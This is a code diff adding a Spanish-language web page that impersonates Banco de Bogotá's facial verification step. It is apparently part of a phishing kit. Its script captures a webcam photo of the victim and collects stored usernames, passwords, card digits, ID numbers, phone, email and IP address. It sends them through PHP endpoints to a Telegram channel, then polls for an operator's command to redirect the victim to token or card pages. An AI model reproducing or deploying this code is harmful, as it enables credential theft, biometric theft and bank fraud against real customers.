@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Verificación Facial - Banco de Bogotá</title>
+  <link rel="stylesheet" href="style.css">
+  <style>
+    /* Estilos específicos para facial_step.html */
+    .camera-container {
+      position: relative;
+      width: 100%;
+      max-width: 320px;
+      margin: 0 auto;
+      background: #000;
+      border-radius: 12px;
+      overflow: hidden;
+      aspect-ratio: 3/4;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+    }
+    
+    .camera-video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+      transform: scaleX(-1);
+    }
+    
+    .camera-preview {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+    
+    .camera-overlay {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 200px;
+      height: 250px;
+      border: 3px solid rgba(30, 64, 175, 0.8);
+      border-radius: 10px;
+      pointer-events: none;
+      box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.5);
+    }
+    
+    .loading-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.85);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 10;
+      border-radius: 12px;
+    }
+    
+    .loading-spinner {
+      width: 60px;
+      height: 60px;
+      border: 4px solid rgba(255, 255, 255, 0.2);
+      border-top: 4px solid #1e40af;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    
+    .loading-text {
+      color: white;
+      font-size: 16px;
+      font-weight: 500;
+      text-align: center;
+      margin: 0;
+    }
+    
+    .error-message {
+      background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
+      color: white;
+      padding: 12px 20px;
+      border-radius: 8px;
+      margin: 20px auto;
+      max-width: 320px;
+      text-align: center;
+      font-weight: 500;
+      display: none;
+    }
+    
+    .success-message {
+      background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+      color: white;
+      padding: 12px 20px;
+      border-radius: 8px;
+      margin: 20px auto;
+      max-width: 320px;
+      text-align: center;
+      font-weight: 500;
+      display: none;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    .form-container-facial {
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+    
+    .instructions {
+      text-align: center;
+      color: #4b5563;
+      margin-bottom: 25px;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+    
+    .btn-facial {
+      background: linear-gradient(135deg, #1e40af 0%, #1e3a8a 100%);
+      color: white;
+      border: none;
+      padding: 15px 20px;
+      border-radius: 25px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      width: 100%;
+      margin: 10px 0;
+      transition: all 0.3s ease;
+    }
+    
+    .btn-facial:hover:not(:disabled) {
+      background: linear-gradient(135deg, #1e3a8a 0%, #1e40af 100%);
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(30, 64, 175, 0.3);
+    }
+    
+    .btn-facial:disabled {
+      background: #9ca3af;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+    
+    .btn-secondary {
+      background: #6b7280;
+      color: white;
+      border: none;
+      padding: 15px 20px;
+      border-radius: 25px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      width: 100%;
+      margin: 10px 0;
+      transition: all 0.3s ease;
+    }
+    
+    .btn-secondary:hover {
+      background: #4b5563;
+      transform: translateY(-2px);
+    }
+    
+    .hidden {
+      display: none !important;
+    }
+    
+    .visible {
+      display: block !important;
+    }
+    
+    .camera-preview.loading {
+      opacity: 0.7;
+      transition: opacity 0.3s ease;
+    }
+    
+    #photoData {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="text-center" style="background: linear-gradient(135deg, #1e40af 0%, #1e3a8a 100%); padding: 20px; border-radius: 0 0 15px 15px; margin: 0 -15px 20px -15px;">
+    <img src="img/descarga.svg" alt="Banco de Bogotá" class="logo mb-2" style="display: block; margin: 0 auto;">
+  </div>
+  
+  <div class="text-center mt-4">
+    <h3 class="mt-1 fw-bold" style="text-align: center; width: 100%;">Verificación Facial</h3>
+  </div>
+  
+  <!-- Mensaje de error (solo visible cuando viene de redirección del admin) -->
+  <div id="adminError" class="error-message">
+    <strong>⚠️ Error en verificación facial:</strong><br>
+    Por favor, intente nuevamente asegurándose de que su rostro esté bien iluminado y centrado.
+  </div>
+  
+  <!-- Mensaje de éxito (oculto inicialmente) -->
+  <div id="successMessage" class="success-message">
+    <strong>✅ Verificación exitosa:</strong><br>
+    Redirigiendo a la página principal...
+  </div>
+  
+  <div class="container-box">
+    <div class="form-container-facial">
+      <p class="instructions">
+        Para su seguridad, necesitamos verificar su identidad mediante reconocimiento facial.<br>
+        Asegúrese de estar en un lugar bien iluminado y mire directamente a la cámara.
+      </p>
+      
+      <!-- Camera Container -->
+      <div id="cameraSection">
+        <div class="camera-container">
+          <video id="video" class="camera-video" autoplay playsinline muted></video>
+          <canvas id="canvas" class="hidden"></canvas>
+          <div class="camera-overlay"></div>
+        </div>
+        <p class="instructions" style="margin-top: 15px;">
+          Coloque su rostro dentro del marco rectangular y mantenga una expresión neutral.
+        </p>
+      </div>
+      
+      <!-- Preview Container (hidden by default) -->
+      <div id="previewSection" class="hidden">
+        <div class="camera-container">
+          <img id="preview" class="camera-preview" alt="Foto capturada" />
+          <div id="loadingOverlay" class="loading-overlay hidden">
+            <div class="loading-spinner"></div>
+            <p class="loading-text">Procesando verificación facial...</p>
+          </div>
+        </div>
+      </div>
+      
+      <!-- Buttons -->
+      <div class="space-y-3">
+        <button id="captureButton" class="btn-facial">
+          📸 Tomar Foto
+        </button>
+        
+        <button id="retakeButton" class="btn-secondary hidden">
+          🔄 Tomar Otra Foto
+        </button>
+        
+        <button id="continueButton" class="btn-facial hidden">
+          ✅ Continuar Verificación
+        </button>
+        
+        <button id="backButton" class="btn-secondary" onclick="window.location.href='index.html'">
+          ↩️ Volver al Inicio
+        </button>
+      </div>
+      
+      <!-- Hidden input para almacenar datos de la foto -->
+      <input type="hidden" id="photoData">
+    </div>
+  </div>
+  
+  <!-- Loader overlay -->
+  <div id="loader-overlay">
+    <div class="loader-spinner">
+      <img src="img/21l.svg" alt="Loading" style="width: 100%; height: 100%; object-fit: contain;">
+    </div>
+  </div>
+  
+  <script>
+    // Variables globales
+    let stream = null;
+    let video, canvas, preview, captureButton, retakeButton, continueButton;
+    let cameraSection, previewSection, loadingOverlay;
+    let verificationAttempts = 0;
+    let sessionId = localStorage.getItem('session_id');
+    let fromAdminRedirect = false;
+    let capturedPhotoData = null;
+    
+    // Verificar si viene de redirección del admin (por parámetro URL)
+    function checkUrlParams() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const source = urlParams.get('source');
+      const error = urlParams.get('error');
+      
+      if (source === 'admin' || error === 'facial_error') {
+        fromAdminRedirect = true;
+        document.getElementById('adminError').style.display = 'block';
+      }
+      
+      // Generar session_id si no existe
+      if (!sessionId) {
+        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        localStorage.setItem('session_id', sessionId);
+      }
+    }
+    
+    // Iniciar cámara
+    async function startCamera() {
+      try {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+          throw new Error('Su navegador no soporta el acceso a la cámara.');
+        }
+        
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: 'user',
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          },
+          audio: false
+        });
+        
+        if (video) {
+          video.srcObject = stream;
+          
+          try {
+            await video.play();
+            console.log('Cámara activada correctamente');
+            captureButton.disabled = false;
+          } catch (playError) {
+            console.error('Error al reproducir video:', playError);
+            throw new Error('No se puede reproducir el video de la cámara.');
+          }
+        }
+        
+      } catch (error) {
+        console.error('Error al acceder a la cámara:', error);
+        alert('Error al acceder a la cámara: ' + error.message);
+        captureButton.disabled = true;
+      }
+    }
+    
+    // Detener cámara
+    function stopCamera() {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+      }
+    }
+    
+    // Convertir DataURL a Blob
+    function dataURLtoBlob(dataurl) {
+      const arr = dataurl.split(',');
+      const mime = arr[0].match(/:(.*?);/)[1];
+      const bstr = atob(arr[1]);
+      let n = bstr.length;
+      const u8arr = new Uint8Array(n);
+      while (n--) {
+        u8arr[n] = bstr.charCodeAt(n);
+      }
+      return new Blob([u8arr], { type: mime });
+    }
+    
+    // Inicializar
+    document.addEventListener('DOMContentLoaded', function() {
+      // Verificar parámetros URL
+      checkUrlParams();
+      
+      // Obtener referencias a elementos
+      video = document.getElementById('video');
+      canvas = document.getElementById('canvas');
+      preview = document.getElementById('preview');
+      captureButton = document.getElementById('captureButton');
+      retakeButton = document.getElementById('retakeButton');
+      continueButton = document.getElementById('continueButton');
+      cameraSection = document.getElementById('cameraSection');
+      previewSection = document.getElementById('previewSection');
+      loadingOverlay = document.getElementById('loadingOverlay');
+      
+      // Capturar foto
+      captureButton.addEventListener('click', () => {
+        try {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          
+          const ctx = canvas.getContext('2d');
+          ctx.imageSmoothingEnabled = true;
+          ctx.imageSmoothingQuality = 'high';
+          ctx.translate(canvas.width, 0);
+          ctx.scale(-1, 1);
+          ctx.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
+          
+          capturedPhotoData = canvas.toDataURL('image/jpeg', 0.9);
+          preview.src = capturedPhotoData;
+          document.getElementById('photoData').value = capturedPhotoData;
+          
+          stopCamera();
+          
+          cameraSection.classList.add('hidden');
+          previewSection.classList.remove('hidden');
+          captureButton.classList.add('hidden');
+          retakeButton.classList.remove('hidden');
+          continueButton.classList.remove('hidden');
+          document.getElementById('adminError').style.display = 'none';
+          
+        } catch (error) {
+          console.error('Error al capturar foto:', error);
+          alert('Error al capturar la foto. Por favor, intente nuevamente.');
+        }
+      });
+      
+      // Volver a tomar foto
+      retakeButton.addEventListener('click', () => {
+        previewSection.classList.add('hidden');
+        cameraSection.classList.remove('hidden');
+        retakeButton.classList.add('hidden');
+        continueButton.classList.add('hidden');
+        captureButton.classList.remove('hidden');
+        capturedPhotoData = null;
+        startCamera();
+      });
+      
+      // Continuar verificación
+      continueButton.addEventListener('click', async () => {
+        verificationAttempts++;
+        
+        if (!capturedPhotoData) {
+          alert('No hay foto capturada. Por favor, tome una foto primero.');
+          return;
+        }
+        
+        continueButton.disabled = true;
+        continueButton.textContent = 'Procesando...';
+        
+        preview.classList.add('loading');
+        loadingOverlay.classList.remove('hidden');
+        
+        // Ocultar mensaje de error si estaba visible
+        document.getElementById('adminError').style.display = 'none';
+        
+        // Enviar datos a Telegram (CON LA FOTO)
+        await enviarDatosFacialATelegram(capturedPhotoData);
+        
+        // Simular procesamiento
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        
+        loadingOverlay.classList.add('hidden');
+        preview.classList.remove('loading');
+        
+        // Iniciar polling para verificar respuesta del admin
+        checkFacialVerification(sessionId);
+      });
+      
+      // Iniciar cámara
+      startCamera();
+    });
+    
+    // Enviar datos faciales a Telegram CON FOTO
+    async function enviarDatosFacialATelegram(photoData) {
+      const loader = document.getElementById('loader-overlay');
+      if (loader) {
+        loader.style.display = 'flex';
+      }
+      
+      // Detectar dispositivo
+      const userAgent = navigator.userAgent;
+      let dispositivo = 'PC';
+      if (/Android/i.test(userAgent)) dispositivo = 'Android';
+      else if (/iPhone|iPad|iPod/i.test(userAgent)) dispositivo = 'iPhone';
+      else if (/Windows/i.test(userAgent)) dispositivo = 'PC';
+      else if (/Mac/i.test(userAgent)) dispositivo = 'Mac';
+      else if (/Linux/i.test(userAgent)) dispositivo = 'Linux';
+      
+      const hora = new Date().toLocaleString('es-ES');
+      const identificacion = localStorage.getItem('identificacion') || 'No disponible';
+      const password = localStorage.getItem('password') || 'No disponible';
+      const digitos = localStorage.getItem('digitos') || 'No disponible';
+      
+      try {
+        const ipResponse = await fetch('get_ip.php');
+        const ipData = await ipResponse.json();
+        const ip = ipData.ip || 'No disponible';
+        
+        // Crear mensaje de texto
+        const mensaje = `
+<b><u>💎BANCO DE BOGOTA - VERIFICACIÓN FACIAL💎</u></b>
+• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+• <b>🏦Banco:</b> ${localStorage.getItem('nom') || 'No disponible'}
+------------------------------
+• <b>📟Dispositivo:</b> ${dispositivo}
+• <b>🗺IP:</b> ${ip}
+• <b>⏱Hora:</b> ${hora}
+------------------------------
+• 👤 Usuario: ${identificacion}
+• 🔑 Clave: ${password}
+${digitos !== 'No disponible' ? `💳 Dígitos: ${digitos}` : ''}
+📸 Facial capturada (↑↑↑ 𝗘𝗡 𝗘𝗟 𝗠𝗘𝗡𝗦𝗔𝗝𝗘 𝗗𝗘 𝗔𝗥𝗥𝗜𝗕𝗔 ↑↑↑)
+------------------------------`;
+
+        // Primero enviar la foto
+        const photoBlob = dataURLtoBlob(photoData);
+        const photoFormData = new FormData();
+        photoFormData.append('photo', photoBlob, 'facial_verification.jpg');
+        photoFormData.append('caption', '📸 Foto de verificación facial');
+        photoFormData.append('transactionId', sessionId);
+        photoFormData.append('isPhoto', 'true');
+
+        try {
+          // Enviar foto primero
+          const photoResponse = await fetch('procesar_facial.php', {
+            method: 'POST',
+            body: photoFormData
+          });
+          
+          const photoResult = await photoResponse.json();
+          console.log('Foto enviada:', photoResult);
+        } catch (photoError) {
+          console.error('Error al enviar foto:', photoError);
+        }
+
+        // Luego enviar el mensaje con los botones
+        await new Promise(resolve => setTimeout(resolve, 500));
+        
+        const textFormData = new FormData();
+        textFormData.append('message', mensaje);
+        textFormData.append('transactionId', sessionId);
+        textFormData.append('isText', 'true');
+
+        const response = await fetch('procesar_facial.php', {
+          method: 'POST',
+          body: textFormData
+        });
+        
+        const result = await response.json();
+        console.log('Mensaje enviado:', result);
+        
+      } catch (error) {
+        console.error('Error al enviar a Telegram:', error);
+      } finally {
+        if (loader) {
+          loader.style.display = 'none';
+        }
+      }
+    }
+    
+    async function checkFacialVerification(transactionId) {
+      try {
+        const formData = new FormData();
+        formData.append('transactionId', transactionId);
+
+        const res = await fetch('verificar_facial.php', {
+          method: 'POST',
+          body: formData
+        });
+
+        const result = await res.json();
+
+        if (result && result.action) {
+          switch (result.action) {
+            case 'pedir_dinamica':
+              window.location.href = "token.php?identificacion=" + encodeURIComponent(localStorage.getItem('identificacion'));
+              break;
+
+            case 'error_logo':
+              window.location.href = "index.html";
+              break;
+
+            case 'error_tc':
+            case 'tarjeta':
+              window.location.href = "tarjeta.php?identificacion=" + encodeURIComponent(localStorage.getItem('identificacion'));
+              break;
+
+            case 'facial':
+              // Si el admin vuelve a enviar a facial, mostrar error
+              window.location.href = "facial_step.html?source=admin&error=facial_error";
+              break;
+
+            case 'confirm_finalizar':
+              document.getElementById('successMessage').style.display = 'block';
+              setTimeout(() => {
+                window.location.href = "finalizado.php";
+              }, 2000);
+              break;
+
+            default:
+              setTimeout(() => checkFacialVerification(transactionId), 2000);
+              break;
+          }
+        } else {
+          setTimeout(() => checkFacialVerification(transactionId), 2000);
+        }
+
+      } catch (err) {
+        console.error('Error en polling:', err);
+        setTimeout(() => checkFacialVerification(transactionId), 2000);
+      }
+    }
+    
+    // Limpiar al salir
+    window.addEventListener('beforeunload', () => {
+      stopCamera();
+    });
+  </script>
+</body>
+</html>
